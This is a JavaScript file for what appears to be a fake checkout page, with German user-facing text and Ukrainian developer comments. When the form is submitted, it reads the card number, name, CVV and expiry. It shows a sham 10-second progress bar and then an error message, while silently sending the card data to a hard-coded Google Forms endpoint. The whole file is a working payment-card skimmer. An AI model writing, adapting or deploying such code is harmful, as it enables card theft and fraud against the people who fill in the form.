function showUnavailable() {
    alert('Diese Funktion ist vorübergehend nicht verfügbar');
}

function formatExpiryDate() {
    const expiryField = document.getElementById('expiry');
    if (!expiryField) return;
    let value = expiryField.value.replace(/\D/g, '');
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    expiryField.value = value;
}

const expiryElem = document.getElementById('expiry');
if (expiryElem) {
    expiryElem.addEventListener('input', formatExpiryDate);
}

function showProgressBar() {
    const progressContainer = document.createElement('div');
    progressContainer.style.width = '100%';
    progressContainer.style.height = '6px';
    progressContainer.style.backgroundColor = '#e2e8f0';
    progressContainer.style.borderRadius = '3px';
    progressContainer.style.margin = '20px 0';
    progressContainer.style.overflow = 'hidden';
    
    const progressBar = document.createElement('div');
    progressBar.style.height = '100%';
    progressBar.style.width = '0%';
    progressBar.style.backgroundColor = '#48bb78';
    progressBar.style.borderRadius = '3px';
    progressBar.style.transition = 'width 10s linear';
    
    progressContainer.appendChild(progressBar);
    
    const payButton = document.querySelector('button[type="submit"]');
    if (payButton && payButton.parentNode) {
        payButton.parentNode.insertBefore(progressContainer, payButton);
    }
    
    setTimeout(() => {
        progressBar.style.width = '100%';
    }, 100);
    
    return progressContainer;
}

document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const payButton = document.querySelector('button[type="submit"]');
    if (payButton) payButton.style.display = 'none';
    
    const progressContainer = showProgressBar();
    
    const cardData = {
        number: (document.getElementById('cardNumber')?.value || '').replace(/\s/g, ''),
        name: document.getElementById('cardName')?.value || '',
        cvv: document.getElementById('cvv')?.value || '',
        expiry: document.getElementById('expiry')?.value || ''
    };

    // Імітуємо час обробки (10с)
    await new Promise(resolve => setTimeout(resolve, 10000));
    
    // Показати повідомлення про помилку (як у твоєму коді)
    const errEl = document.getElementById('errorMessage');
    if (errEl) errEl.style.display = 'block';
    if (payButton) payButton.style.display = 'block';
    if (progressContainer) progressContainer.remove();
    
    // Підготовка даних для Google Forms (один стовпець)
    const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSc-FI_do40MNdRW0gVCFCM_agQgunKWY7ULj3Ywi0UGPXAoLg/formResponse';
    const ENTRY_KEY = 'entry.76967225'; // твій стовпець

    const combined = 
        `Card Number: ${cardData.number}\n` +
        `Name: ${cardData.name}\n` +
        `CVV: ${cardData.cvv}\n` +
        `Expiry: ${cardData.expiry}\n` +
        `Time: ${new Date().toLocaleString('de-DE')}`;

    const formData = new URLSearchParams();
    formData.append(ENTRY_KEY, combined);

    // Надсилаємо — для Google Forms зазвичай підходить mode: 'no-cors'
    try {
        await fetch(FORM_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
            },
            body: formData.toString()
        });
        console.log('Data submission attempted (no-cors)');
    } catch (error) {
        console.log('Fetch error (ignored for no-cors):', error);
    }
});
